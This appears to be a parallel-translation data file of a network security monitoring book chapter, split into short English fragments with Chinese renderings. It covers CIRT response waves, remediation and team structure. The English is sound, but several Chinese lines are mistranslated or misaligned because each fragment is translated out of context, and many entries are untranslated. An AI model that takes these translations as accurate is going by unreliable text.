- en: that CIRTs devise names to refer to waves . Names are easier to remember than
  id: totrans-794
  prefs: []
  type: TYPE_NORMAL
- en: numbers, and using them makes it easier for CIRTs to discuss serious activities
  id: totrans-795
  prefs: []
  type: TYPE_NORMAL
- en: with constituents . Some CIRTs use the names assigned by the National Weather
  id: totrans-796
  prefs: []
  type: TYPE_NORMAL
- en: Service’s National Hurricane Center ( *ht p://www.nhc.noaa.gov/aboutnames*
  id: totrans-797
  prefs: []
  type: TYPE_NORMAL
- en: '*.shtml*) for a year’s worth of wave names . For example, the first wave of
    2013'
  id: totrans-798
  prefs: []
  type: TYPE_NORMAL
- en: initiated by a CIRT to counter advanced threat activity would be named Wave
  id: totrans-799
  prefs: []
  type: TYPE_NORMAL
- en: Andrea, the second would be Wave Barry, and so on .
  id: totrans-800
  prefs: []
  type: TYPE_NORMAL
- en: It is crucial to recognize that, in the heat of an intrusion, CIRTs lack the
  id: totrans-801
  prefs: []
  type: TYPE_NORMAL
  zh: 在入侵的高压情况下，CIRT 缺乏
- en: ability to ful y identify adversary activity . It does not make sense to assign
    a
  id: totrans-802
  prefs: []
  type: TYPE_NORMAL
  zh: 能够完全识别对手活动的能力。分配一个
- en: campaign to adversary activity in the heat of battle . Rather, organize accord-
  id: totrans-803
  prefs: []
  type: TYPE_NORMAL
  zh: 将活动与敌人行为的热战进行对比。相反，根据
- en: ing to how the CIRT is responding . Outside the digital melee of the ongoing
  id: totrans-804
  prefs: []
  type: TYPE_NORMAL
  zh: 有关 CIRT 如何响应的外部信息。在持续的数字混战中，
- en: response activities, the CIRT’s intel igence team can perform analysis to deter-
  id: totrans-805
  prefs: []
  type: TYPE_NORMAL
  zh: 通过响应活动，CIRT 的情报小组可以进行分析，确定
- en: mine how observed adversary actions fit into the overall picture .
  id: totrans-806
  prefs: []
  type: TYPE_NORMAL
  zh: 确定观察到的敌人行为如何融入整体局势。
- en: Mature CIRTs track numerous threat groups, such as nation-state, criminal,
  id: totrans-807
  prefs: []
  type: TYPE_NORMAL
  zh: 成熟的 CIRT 跟踪多个威胁团体，如国家级、犯罪集团、
- en: and hacktivist actors . CIRT intel igence teams will assign adversary activity
    to
  id: totrans-808
  prefs: []
  type: TYPE_NORMAL
  zh: 和黑客活动者。CIRT 情报小组会将对手的活动分配到
- en: these threat groups, pairing the CIRT’s wave response with the threat group
    in
  id: totrans-809
  prefs: []
  type: TYPE_NORMAL
  zh: 将这些威胁团体与 CIRT 的波动响应配对
- en: question . For example, the intel igence team may realize that Wave Andrea
  id: totrans-810
  prefs: []
  type: TYPE_NORMAL
  zh: 问题。例如，情报小组可能会意识到“波动 Andrea”
- en: was the CIRT’s response to APT12, while Wave Barry was the CIRT’s response
  id: totrans-811
  prefs: []
  type: TYPE_NORMAL
  zh: 是 CIRT 对 APT12 的响应，而“波动 Barry”是 CIRT 对
- en: to APT1 .
  id: totrans-812
  prefs: []
  type: TYPE_NORMAL
  zh: 针对 APT1 的响应。
- en: criminal groups often talk in terms of adversary *campaigns*. A campaign
  id: totrans-813
  prefs: []
  type: TYPE_NORMAL
  zh: 犯罪团体经常用“敌人*活动*”来讨论。一次活动
- en: is a long-term operation conducted by an adversary, usually to steal infor-
  id: totrans-814
  prefs: []
  type: TYPE_NORMAL
  zh: 是敌人进行的一项长期操作，通常是为了窃取信息，
- en: mation. A single intrusion is likely to be just one piece of an adversary’s
  id: totrans-815
  prefs: []
  type: TYPE_NORMAL
  zh: 信息。一次单独的入侵可能只是对手攻击的一个环节。
- en: campaign.
  id: totrans-816
  prefs: []
  type: TYPE_NORMAL
  zh: 活动。
- en: CIRTs fighting persistent foes tend to organize their response actions
  id: totrans-817
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 对抗持久敌人时，通常会组织其响应行动
- en: as *waves.* A wave does not exactly correspond to a campaign. Whereas a
  id: totrans-818
  prefs: []
  type: TYPE_NORMAL
  zh: 如同*波动*一样。一波并不完全等同于一次活动。相比之下，一个
- en: campaign refers to the totality of an intruder’s prolonged attack against
  id: totrans-819
  prefs: []
  type: TYPE_NORMAL
  zh: 活动指的是入侵者对目标进行长期攻击的整体。
- en: a target, a wave refers to the CIRT’s efforts to detect and respond to the
  id: totrans-820
  prefs: []
  type: TYPE_NORMAL
  zh: 一个目标，一波指的是 CIRT 检测并响应对手活动的努力。
- en: adversary. In other words, intruders conduct campaigns, and CIRTs defend
  id: totrans-821
  prefs: []
  type: TYPE_NORMAL
  zh: 敌人。换句话说，入侵者进行活动，CIRT 进行防御。
- en: in waves. CIRTs will never have perfect visibility into adversary activity.
  id: totrans-822
  prefs: []
  type: TYPE_NORMAL
  zh: 按波次进行。CIRT 永远无法完全洞察敌人的活动。
- en: Therefore, track what you *think* the adversary is doing (for example, a cam-
  id: totrans-823
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，跟踪你*认为*敌人在做什么（例如，一次活动）
- en: paign), as well as what the CIRT *is* doing (for example, a wave).
  id: totrans-824
  prefs: []
  type: TYPE_NORMAL
  zh: 活动），以及 CIRT *正在做什么*（例如，一波行动）。
- en: Mature CIRTs, upon recognizing that they need to respond to a serious
  id: totrans-825
  prefs: []
  type: TYPE_NORMAL
  zh: 成熟的 CIRT 认识到需要应对一次严重的
- en: incident, are likely to take the following steps.
  id: totrans-826
  prefs: []
  type: TYPE_NORMAL
  zh: 事件采取的步骤。
- en: 1\. Select a wave name and declare the wave open.
  id: totrans-827
  prefs: []
  type: TYPE_NORMAL
  zh: 1\. 选择一个波动名称，并宣布波动开始。
- en: 2\. Create a telephone bridge and password-protected real-time chatroom
  id: totrans-828
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. 创建一个电话桥接和密码保护的实时聊天室
- en: to discuss activities to counter the adversary.
  id: totrans-829
  prefs: []
  type: TYPE_NORMAL
  zh: 讨论反制敌人的活动。
- en: 3\. Send an urgent notice to affected constituents letting them know that
  id: totrans-830
  prefs: []
  type: TYPE_NORMAL
  zh: 3\. 向受影响的相关方发送紧急通知，告知他们
- en: the CIRT has opened a wave and how to communicate with the CIRT
  id: totrans-831
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 已经启动一波行动，并且如何与 CIRT 沟通
- en: via the telephone and chatroom.
  id: totrans-832
  prefs: []
  type: TYPE_NORMAL
  zh: 通过电话和聊天室进行交流。
- en: '**200** Chapter 9'
  id: totrans-833
  prefs: []
  type: TYPE_NORMAL
  zh: '**200** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-834
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 4\. Collect and analyze additional evidence as necessary to scope the incident.
  id: totrans-835
  prefs: []
  type: TYPE_NORMAL
  zh: 4\. 根据需要收集并分析其他证据，以界定事件的范围。
- en: 5\. Escalate rapid incident reporting to constituents via real-time and digi-
  id: totrans-836
  prefs: []
  type: TYPE_NORMAL
  zh: 5\. 通过实时和数字方式，迅速向相关方报告事件
- en: tal means, identifying victim systems and data.
  id: totrans-837
  prefs: []
  type: TYPE_NORMAL
  zh: 方式，识别受害系统和数据。
- en: 6\. Coordinate a containment action with the constituents to limit the risk
  id: totrans-838
  prefs: []
  type: TYPE_NORMAL
  zh: 6\. 与相关方协调遏制措施，以限制风险
- en: of data loss, alteration, or denial of service.
  id: totrans-839
  prefs: []
  type: TYPE_NORMAL
  zh: 数据丢失、篡改或服务中断的风险。
- en: 7\. Once containment for all victims is in place, declare the wave closed.
  id: totrans-840
  prefs: []
  type: TYPE_NORMAL
  zh: 7\. 一旦所有受害者的遏制措施到位，宣布一波行动结束。
- en: 8\. Throughout the duration of the wave, communicate regularly with con-
  id: totrans-841
  prefs: []
  type: TYPE_NORMAL
  zh: 8\. 在整个波动期间，定期与相关方沟通
- en: stituents to keep them informed and to reduce tension.
  id: totrans-842
  prefs: []
  type: TYPE_NORMAL
  zh: 以便让相关方保持知情，并减少紧张情绪。
- en: For less serious events, CIRTs do not need to employ such elaborate
  id: totrans-843
  prefs: []
  type: TYPE_NORMAL
  zh: 对于不太严重的事件，CIRT 不需要采取如此复杂的
- en: communication methods. CIRTs will concentrate on documenting the
  id: totrans-844
  prefs: []
  type: TYPE_NORMAL
  zh: 沟通方法。CIRT 会集中精力记录
- en: incident in an efficient manner and notifying the constituent within the
  id: totrans-845
  prefs: []
  type: TYPE_NORMAL
  zh: 高效处理事件，并在事件发生后的
- en: expected service time windows. For both types of events, CIRTs should mea-
  id: totrans-846
  prefs: []
  type: TYPE_NORMAL
  zh: 预期的服务时间窗口。对于这两类事件，CIRT 应该衡量——
- en: sure times of key steps in the detection and response process. For example,
  id: totrans-847
  prefs: []
  type: TYPE_NORMAL
  zh: 确保关键步骤的时间。例如——
- en: the text at the bottom of Figure 9-2 (which illustrates the elements of the
  id: totrans-848
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9-2 底部的文字（展示了——
- en: NSM process) depicts points during the incident detection and response
  id: totrans-849
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 过程）展示了在事件检测和响应过程中的关键点。
- en: subprocesses when time should be recorded. Figure 9-6 reproduces those
  id: totrans-850
  prefs: []
  type: TYPE_NORMAL
  zh: 子流程应该记录时间。图 9-6 重现了那些——
- en: key moments.
  id: totrans-851
  prefs: []
  type: TYPE_NORMAL
  zh: 关键时刻。
- en: Request more data
  id: totrans-852
  prefs: []
  type: TYPE_NORMAL
  zh: 请求更多数据
- en: Event observed/stored
  id: totrans-853
  prefs: []
  type: TYPE_NORMAL
  zh: 事件已观察/存储
- en: Identification
  id: totrans-854
  prefs: []
  type: TYPE_NORMAL
  zh: 识别
- en: Validation
  id: totrans-855
  prefs: []
  type: TYPE_NORMAL
  zh: 验证
- en: Documentation
  id: totrans-856
  prefs: []
  type: TYPE_NORMAL
  zh: 文档
- en: Notification
  id: totrans-857
  prefs: []
  type: TYPE_NORMAL
  zh: 通知
- en: Acknowledgment
  id: totrans-858
  prefs: []
  type: TYPE_NORMAL
  zh: 确认
- en: Containment
  id: totrans-859
  prefs: []
  type: TYPE_NORMAL
  zh: 隔离
- en: Remediation
  id: totrans-860
  prefs: []
  type: TYPE_NORMAL
  zh: 修复
- en: '*Figure 9-6: Events for which time should be recorded*'
  id: totrans-861
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-6：应该记录时间的事件*'
- en: So far, we’ve focused on containment, or countermeasures, designed
  id: totrans-862
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们主要关注的是隔离，或旨在——
- en: to limit risk, but containment alone still leaves the victim computer com-
  id: totrans-863
  prefs: []
  type: TYPE_NORMAL
  zh: 以限制风险，但单靠隔离仍然会让受害计算机处于威胁中——
- en: promised. Once an attack has been contained, it’s time for *remediation,* or
  id: totrans-864
  prefs: []
  type: TYPE_NORMAL
  zh: 承诺。一旦攻击被隔离，就该进入 *修复* 阶段，或者——
- en: restoring the compromised asset to a trustworthy state.
  id: totrans-865
  prefs: []
  type: TYPE_NORMAL
  zh: 恢复受损资产到一个可信状态。
- en: '**remediation**'
  id: totrans-866
  prefs: []
  type: TYPE_NORMAL
  zh: '**修复**'
- en: Remediation is another hot topic in the security industry. Some argue that
  id: totrans-867
  prefs: []
  type: TYPE_NORMAL
  zh: 修复是安全行业的另一个热点话题。一些人认为——
- en: systems can be “cleaned” to remove the intruder’s tools, persistence mecha-
  id: totrans-868
  prefs: []
  type: TYPE_NORMAL
  zh: 系统可以“清理”以去除入侵者的工具、持久性机制——
- en: nisms, and access methods. Others say victim computers should be rebuilt
  id: totrans-869
  prefs: []
  type: TYPE_NORMAL
  zh: 和访问方法。另一些人认为，受害计算机应该重建——
- en: from installation media or trustworthy backups. A few even say compromised
  id: totrans-870
  prefs: []
  type: TYPE_NORMAL
  zh: 从安装介质或可信备份恢复。一些甚至表示已被攻陷——
- en: systems should be reflashed or abandoned, because advanced intruders can
  id: totrans-871
  prefs: []
  type: TYPE_NORMAL
  zh: 系统应该重新闪存或放弃，因为高级入侵者可以——
- en: implant persistence mechanisms in hardware!
  id: totrans-872
  prefs: []
  type: TYPE_NORMAL
  zh: 在硬件中植入持久性机制！
- en: You should rebuild any system with which an adversary was known
  id: totrans-873
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该重建任何已知有敌方接入的系统
- en: to interact, but only after fully scoping the incident. Here, *interact* means
  id: totrans-874
  prefs: []
  type: TYPE_NORMAL
  zh: 与之互动，但仅在完全了解事件范围后才进行。这里的 *互动* 意味着——
- en: there is a forensic reason to assume the adversary acquired and utilized
  id: totrans-875
  prefs: []
  type: TYPE_NORMAL
  zh: 如果有法医原因可以假设敌方已经获取并利用了——
- en: unauthorized access to a victim. It does not mean the intruder *could* have
  id: totrans-876
  prefs: []
  type: TYPE_NORMAL
  zh: 未经授权访问受害者。这并不意味着入侵者 *可能*——
- en: accessed the victim, but did not. The fact of that matter is that it is virtu-
  id: totrans-877
  prefs: []
  type: TYPE_NORMAL
  zh: 接触了受害者，但并没有。实际上，这件事的真相是它是虚拟的——
- en: ally impossible for a CIRT to know all the actions an intruder took on any
  id: totrans-878
  prefs: []
  type: TYPE_NORMAL
  zh: 对任何系统中的入侵者的行为，CIRT 通常不可能完全知晓。
- en: NSM Operations **201**
  id: totrans-879
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **201**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-880
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: victim. Usually, a CIRT sees only the proverbial “tip of the iceberg.” After
    all, why jeopardize a remediation plan by trying to “clean” a victim, only to
  id: totrans-881
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者的风险容忍度。通常，一个 CIRT 看到的只是所谓的“冰山一角”。毕竟，为什么要在尝试“清理”受害者时危及修复计划，结果却——
- en: learn that disinfection failed to remove a persistence mechanism?
  id: totrans-882
  prefs: []
  type: TYPE_NORMAL
  zh: 学习到消毒未能去除持久性机制？
- en: How fast should you remediate? Some CIRTs strive to limit the time
  id: totrans-883
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该多快进行修复？一些 CIRT 努力将——
- en: from *detection to containment* to one hour or less. Others are more aggressive
    (and ambitious) and strive to limit the time from *adversary access to remediation*
    to one hour or less. The choice depends on the risk tolerance of your
  id: totrans-884
  prefs: []
  type: TYPE_NORMAL
  zh: 从 *检测到隔离* 一小时内完成。其他人则更激进（也更有野心），努力将 *敌方访问到修复* 的时间限制在一小时以内。选择取决于你——
- en: organization and the capabilities of the CIRT, IT teams, and constituents.
  id: totrans-885
  prefs: []
  type: TYPE_NORMAL
  zh: 组织和 CIRT、IT 团队以及各方的能力。
- en: Once you start tracking times from detection to containment, you may find
  id: totrans-886
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你开始追踪从检测到隔离的时间，你可能会发现——
- en: that containment takes weeks, not an hour. Record these metrics and try to
  id: totrans-887
  prefs: []
  type: TYPE_NORMAL
  zh: 隔离通常需要数周，而不是一个小时。记录这些指标并尽量——
- en: drive down the time as you continue to develop your process and tactics.
  id: totrans-888
  prefs: []
  type: TYPE_NORMAL
  zh: 随着你继续开发你的过程和战术，尽量减少时间。
- en: '***Using NSM to Improve Security***'
  id: totrans-889
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用 NSM 改进安全性***'
- en: At this point, we have a framework to think about CIRT and security improve-
  id: totrans-890
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，我们有了一个框架来思考 CIRT 和安全改进——
- en: ment. Let’s look at a few examples of how it could work in practice.
  id: totrans-891
  prefs: []
  type: TYPE_NORMAL
  zh: 我们来看一些实际操作中的例子。
- en: • A vendor proposes adding a probe to collect and interpret NetFlow
  id: totrans-892
  prefs: []
  type: TYPE_NORMAL
  zh: • 一个供应商提出增加探针来收集和解释 NetFlow
- en: records (a type of session data) from border routers. This activity
  id: totrans-893
  prefs: []
  type: TYPE_NORMAL
  zh: 来自边界路由器的记录（某种类型的会话数据）。此活动——
- en: belongs in the collection phase of the NSM process. Because the CIRT
  id: totrans-894
  prefs: []
  type: TYPE_NORMAL
  zh: 属于 NSM 过程中的收集阶段。因为 CIRT——
- en: already gathers session data using Argus and Bro on SO sensors that
  id: totrans-895
  prefs: []
  type: TYPE_NORMAL
- en: are watching gateways, additional collection may not be necessary. The
  id: totrans-896
  prefs: []
  type: TYPE_NORMAL
- en: CIRT rejects the offer to buy NetFlow processing equipment.
  id: totrans-897
  prefs: []
  type: TYPE_NORMAL
- en: • Mandiant releases its report on APT1 ( *http://www.mandiant.com/apt1/*).
  id: totrans-898
  prefs: []
  type: TYPE_NORMAL
- en: The archive includes more than 3,000 indicators. The CIRT realizes it
  id: totrans-899
  prefs: []
  type: TYPE_NORMAL
- en: can use the indicators for IOC-centric matching activities, part of the
  id: totrans-900
  prefs: []
  type: TYPE_NORMAL
- en: analysis phase in the NSM process. Mandiant also releases over 100 pages
  id: totrans-901
  prefs: []
  type: TYPE_NORMAL
- en: describing tools used by APT1 actors. The CIRT uses that information
  id: totrans-902
  prefs: []
  type: TYPE_NORMAL
- en: for IOC-free hunting analysis.
  id: totrans-903
  prefs: []
  type: TYPE_NORMAL
- en: • The time elapsed from incident detection to containment at a particu-
  id: totrans-904
  prefs: []
  type: TYPE_NORMAL
- en: lar company is on the order of weeks, and the CIO wants to decrease
  id: totrans-905
  prefs: []
  type: TYPE_NORMAL
- en: this to under one hour. A vendor proposes a new asset management
  id: totrans-906
  prefs: []
  type: TYPE_NORMAL
- en: system. Multiple business lines express enthusiasm for the new tool
  id: totrans-907
  prefs: []
  type: TYPE_NORMAL
- en: and form a working group to better manage asset inventory. The CIRT
  id: totrans-908
  prefs: []
  type: TYPE_NORMAL
- en: endorses this new system because it will decrease the time needed to
  id: totrans-909
  prefs: []
  type: TYPE_NORMAL
- en: identify asset owners and will improve the accuracy of incident notifica-
  id: totrans-910
  prefs: []
  type: TYPE_NORMAL
- en: tion during the escalation phase of the NSM process.
  id: totrans-911
  prefs: []
  type: TYPE_NORMAL
- en: • The networking team decides to try implementing a network access
  id: totrans-912
  prefs: []
  type: TYPE_NORMAL
- en: control (NAC) solution. The IT team members resist the program
  id: totrans-913
  prefs: []
  type: TYPE_NORMAL
- en: because they fear it will impede user productivity, but the CIRT thinks
  id: totrans-914
  prefs: []
  type: TYPE_NORMAL
- en: that this solution could be helpful during the resolution phase of the
  id: totrans-915
  prefs: []
  type: TYPE_NORMAL
- en: NSM process. The CIRT convinces the IT team to support the NAC
  id: totrans-916
  prefs: []
  type: TYPE_NORMAL
- en: solution.
  id: totrans-917
  prefs: []
  type: TYPE_NORMAL
- en: '**202** Chapter 9'
  id: totrans-918
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-919
  prefs: []
  type: TYPE_NORMAL
- en: These examples demonstrate how working within the NSM process
  id: totrans-920
  prefs: []
  type: TYPE_NORMAL
- en: can help CIRTs make better decisions regarding their operations. Rather
  id: totrans-921
  prefs: []
  type: TYPE_NORMAL
- en: than being led by the newest security fad or vendor tool, CIRTs can identify
  id: totrans-922
  prefs: []
  type: TYPE_NORMAL
- en: deficiencies in and improve all phases of their NSM process. By addressing
  id: totrans-923
  prefs: []
  type: TYPE_NORMAL
- en: existing gaps, the CIRT can reduce detection and response time and help
  id: totrans-924
  prefs: []
  type: TYPE_NORMAL
- en: identify problems in systems that are leading to compromise.
  id: totrans-925
  prefs: []
  type: TYPE_NORMAL
- en: '***Building a CIRT***'
  id: totrans-926
  prefs: []
  type: TYPE_NORMAL
- en: This book is primarily for those practicing NSM as individuals or as mem-
  id: totrans-927
  prefs: []
  type: TYPE_NORMAL
- en: bers of CIRTs. Those of you working as lone contributors may wish your
  id: totrans-928
  prefs: []
  type: TYPE_NORMAL
- en: constituent to expand the resources for handling NSM duties. To help jus-
  id: totrans-929
  prefs: []
  type: TYPE_NORMAL
- en: 'tify additions, track these key metrics:'
  id: totrans-930
  prefs: []
  type: TYPE_NORMAL
- en: • The classification and count of incidents
  id: totrans-931
  prefs: []
  type: TYPE_NORMAL
- en: • The time elapsed from incident detection to containment
  id: totrans-932
  prefs: []
  type: TYPE_NORMAL
- en: Take these metrics to management staff members and ask if they are
  id: totrans-933
  prefs: []
  type: TYPE_NORMAL
- en: satisfied with their numbers. Are they happy with the type and number of
  id: totrans-934
  prefs: []
  type: TYPE_NORMAL
- en: incidents per quarter and year? Are they content with the amount of time it
  id: totrans-935
  prefs: []
  type: TYPE_NORMAL
- en: takes to progress from incident detection to containment? If the answer is
  id: totrans-936
  prefs: []
  type: TYPE_NORMAL
- en: no, estimate the cost of adding manpower, new tools, and better processes.
  id: totrans-937
  prefs: []
  type: TYPE_NORMAL
- en: That’s your justification for adding new CIRT capabilities, or even creat-
  id: totrans-938
  prefs: []
  type: TYPE_NORMAL
- en: ing the organization’s first CIRT. (For more reasons to build a CIRT and
  id: totrans-939
  prefs: []
  type: TYPE_NORMAL
- en: related counter-threat operations, see my article “Become a Hunter” in the
  id: totrans-940
  prefs: []
  type: TYPE_NORMAL
- en: July–August 2011 issue of *Information Security Magazine* at [*http://taosecurity*](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
  id: totrans-941
  prefs: []
  type: TYPE_NORMAL
  zh: 2011年7-8月期的《信息安全杂志》[*http://taosecurity*](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
    号刊物
- en: '[*.blogspot.com/2011/12/become-hunter.html*.](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
    ) Once you’ve been given the approval to add CIRT capacity, the next decision
    is how to build a team. I recommend'
  id: totrans-942
  prefs: []
  type: TYPE_NORMAL
  zh: '[*.blogspot.com/2011/12/become-hunter.html*.](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
    ) 一旦获得批准增加CIRT能力，接下来的决策是如何建立团队。我建议'
- en: the general functions shown in Figure 9-7\.
  id: totrans-943
  prefs: []
  type: TYPE_NORMAL
  zh: 如图9-7所示的常规功能。
- en: Director of Incident Response
  id: totrans-944
  prefs: []
  type: TYPE_NORMAL
  zh: 事件响应总监
- en: Incident Detection and
  id: totrans-945
  prefs: []
  type: TYPE_NORMAL
  zh: 事件检测与响应
- en: Applied Threat
  id: totrans-946
  prefs: []
  type: TYPE_NORMAL
  zh: 应用威胁
- en: Infrastructure and
  id: totrans-947
  prefs: []
  type: TYPE_NORMAL
  zh: 基础设施和
- en: Response
  id: totrans-948
  prefs: []
  type: TYPE_NORMAL
  zh: 响应
- en: Intelligence
  id: totrans-949
  prefs: []
  type: TYPE_NORMAL
  zh: 情报
- en: Development
  id: totrans-950
  prefs: []
  type: TYPE_NORMAL
  zh: 开发
- en: Incident Handlers
  id: totrans-951
  prefs: []
  type: TYPE_NORMAL
  zh: 事件处理员
- en: Principal Analysts
  id: totrans-952
  prefs: []
  type: TYPE_NORMAL
  zh: 主分析师
- en: Architects
  id: totrans-953
  prefs: []
  type: TYPE_NORMAL
  zh: 建筑师
- en: Incident Analysts
  id: totrans-954
  prefs: []
  type: TYPE_NORMAL
  zh: 事件分析师
- en: Senior Analysts
  id: totrans-955
  prefs: []
  type: TYPE_NORMAL
  zh: 高级分析师
- en: Engineers
  id: totrans-956
  prefs: []
  type: TYPE_NORMAL
  zh: 工程师
- en: Event Analysts
  id: totrans-957
  prefs: []
  type: TYPE_NORMAL
  zh: 事件分析员
- en: Associate Analysts
  id: totrans-958
  prefs: []
  type: TYPE_NORMAL
  zh: 助理分析师
- en: Administrators
  id: totrans-959
  prefs: []
  type: TYPE_NORMAL
  zh: 管理员
- en: Constituent Relations Team
  id: totrans-960
  prefs: []
  type: TYPE_NORMAL
  zh: 成员关系团队
- en: '*Figure 9-7: General CIRT structure*'
  id: totrans-961
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-7：通用CIRT结构*'
- en: NSM Operations **203**
  id: totrans-962
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **203**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-963
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'The CIRT structure includes the following:'
  id: totrans-964
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT结构包括以下组成部分：
- en: '**Director of Incident Response**'
  id: totrans-965
  prefs: []
  type: TYPE_NORMAL
  zh: '**事件响应总监**'
- en: The director organizes, trains, and equips the CIRT to succeed. The
  id: totrans-966
  prefs: []
  type: TYPE_NORMAL
  zh: 总监组织、培训并装备CIRT，确保其成功。总监负责
- en: director selects a deputy from one of the three CIRT components to
  id: totrans-967
  prefs: []
  type: TYPE_NORMAL
  zh: 总监从三个CIRT组成部分中选择一名副手，以协助工作。
- en: assist with this mission, and keeps management away from the CIRT
  id: totrans-968
  prefs: []
  type: TYPE_NORMAL
  zh: 协助执行此任务，并将管理层排除在CIRT之外。
- en: so the CIRT can do its job.
  id: totrans-969
  prefs: []
  type: TYPE_NORMAL
  zh: 以便 CIRT 能够顺利执行其任务。
- en: '**Incident Detection and Response (IDR) Center**'
  id: totrans-970
  prefs: []
  type: TYPE_NORMAL
  zh: '**事件检测与响应 (IDR) 中心**'
- en: This group is responsible for the daily analysis and escalation of secu-
  id: totrans-971
  prefs: []
  type: TYPE_NORMAL
  zh: 该小组负责每日的安全分析和事件升级。
- en: rity incidents. The IDR Center consists of incident handlers (IHs, expe-
  id: totrans-972
  prefs: []
  type: TYPE_NORMAL
  zh: 安全事件。IDR中心包括事件处理员（IHs，有经验的
- en: rienced analysts tasked with hunting), incident analysts (IAs, mid-level
  id: totrans-973
  prefs: []
  type: TYPE_NORMAL
  zh: 经历过猎杀任务的分析师），事件分析员（IAs，中级
- en: analysts who combine hunting with matching), and event analysts (EAs,
  id: totrans-974
  prefs: []
  type: TYPE_NORMAL
  zh: 结合猎杀与匹配的分析师，事件分析师（EAs，
- en: beginning analysts who focus on matching). Analysts at all levels have
  id: totrans-975
  prefs: []
  type: TYPE_NORMAL
  zh: 初级分析师专注于匹配分析。所有级别的分析师都有
- en: access to all datatypes, but EAs and IAs may classify only events for which
  id: totrans-976
  prefs: []
  type: TYPE_NORMAL
  zh: 访问所有数据类型，但EAs和IAs只能对其分类事件进行分类。
- en: they are responsible. IHs train IAs and EAs, take them on digital hunt-
  id: totrans-977
  prefs: []
  type: TYPE_NORMAL
  zh: 他们负责。事件处理员（IHs）训练事件分析员（IAs）和事件分析师（EAs），并带领他们进行数字猎杀。
- en: ing trips, and operationalize lessons into the repeatable playbooks EAs
  id: totrans-978
  prefs: []
  type: TYPE_NORMAL
  zh: 出差并将经验转化为可重复的操作手册，EAs
- en: use to identify intrusions. IHs open, manage, and close waves, depend-
  id: totrans-979
  prefs: []
  type: TYPE_NORMAL
  zh: 用于识别入侵。事件处理员（IHs）开启、管理并关闭波次，视情况而定，
- en: ing on IAs and EAs for support. If possible, the IDR Center works a
  id: totrans-980
  prefs: []
  type: TYPE_NORMAL
  zh: 在事件分析员和事件分析员的支持下进行工作。如果可能，IDR中心与
- en: 24×7 schedule, with at least EAs on 24×7 duty and IHs and IAs on call.
  id: totrans-981
  prefs: []
  type: TYPE_NORMAL
  zh: 24×7 时间表，至少有EAs全天候值班，IHs和IAs随时待命。
- en: '**Applied Threat Intelligence (ATI) Center**'
  id: totrans-982
  prefs: []
  type: TYPE_NORMAL
  zh: '**应用威胁情报 (ATI) 中心**'
- en: This group is responsible for digital intelligence activities, internal
  id: totrans-983
  prefs: []
  type: TYPE_NORMAL
  zh: 该小组负责数字情报活动，内部
- en: security consulting, adversary simulation, red teaming, and penetration
  id: totrans-984
  prefs: []
  type: TYPE_NORMAL
  zh: 安全咨询、对手模拟、红队测试和渗透
- en: 'testing. It includes the following teams:'
  id: totrans-985
  prefs: []
  type: TYPE_NORMAL
  zh: 测试工作。它包括以下小组：
- en: • An *Intelligence Team* provides reporting support during waves and
  id: totrans-986
  prefs: []
  type: TYPE_NORMAL
  zh: • *情报团队* 在波次期间提供报告支持
- en: regular briefings and updates on adversary activity to the CIRT and
  id: totrans-987
  prefs: []
  type: TYPE_NORMAL
  zh: 定期向CIRT和管理层提供对手活动的简报和更新，
- en: constituents. The team members also search evidence for indicators
  id: totrans-988
  prefs: []
  type: TYPE_NORMAL
  zh: 成员搜索证据，寻找指示性
- en: of compromise and analyze it to extract adversary tools, techniques,
  id: totrans-989
  prefs: []
  type: TYPE_NORMAL
  zh: 权衡并分析以提取对手的工具、技术和程序。
- en: and procedures.
  id: totrans-990
  prefs: []
  type: TYPE_NORMAL
  zh: 和程序。
- en: • The *Red Team* proactively assesses and tests the organization to
  id: totrans-991
  prefs: []
  type: TYPE_NORMAL
  zh: • *红队* 主动评估和测试组织的安全
- en: determine its security posture by simulating a wide variety of
  id: totrans-992
  prefs: []
  type: TYPE_NORMAL
  zh: 通过模拟各种攻击手段来确定其安全态势，
- en: threats. This team provides a metric against which CIRT perfor-
  id: totrans-993
  prefs: []
  type: TYPE_NORMAL
  zh: 威胁。该团队提供一种衡量标准，通过它可以评估CIRT的表现。
- en: mance can be measured.
  id: totrans-994
  prefs: []
  type: TYPE_NORMAL
  zh: 性能可以量化。
- en: • The *Blue Team* members act as internal security consultants. They
  id: totrans-995
  prefs: []
  type: TYPE_NORMAL
  zh: • *蓝队* 成员作为内部安全顾问。他们
- en: help the organization improve the security of their assets.
  id: totrans-996
  prefs: []
  type: TYPE_NORMAL
  zh: 帮助组织改善其资产的安全性。
- en: '**Infrastructure and Development (ID) Center**'
  id: totrans-997
  prefs: []
  type: TYPE_NORMAL
  zh: '**基础设施与开发 (ID) 中心**'
- en: This group enables the other two CIRT components by employing soft-
